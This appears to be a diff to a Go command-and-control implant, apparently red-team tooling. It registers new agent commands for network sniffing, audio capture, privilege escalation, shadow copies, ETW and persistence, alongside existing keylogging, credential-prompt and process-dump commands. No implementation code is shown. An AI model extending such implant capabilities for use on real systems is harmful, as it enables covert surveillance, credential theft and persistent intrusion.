@@ -40,4 +40,12 @@ func registerPlatformCommands() {
 	RegisterCommand(&CredentialPromptCommand{})
 	RegisterCommand(&KeylogCommand{})
 	RegisterCommand(&ProcdumpCommand{})
+	RegisterCommand(&AmcacheCommand{})
+	RegisterCommand(&SniffCommand{})
+	RegisterCommand(&AudioCaptureCommand{})
+	RegisterCommand(&LolbinCommand{})
+	RegisterCommand(&EtwCommand{})
+	RegisterCommand(&GetSystemCommand{})
+	RegisterCommand(&VSSCommand{})
+	RegisterCommand(&PersistCommand{})
 }
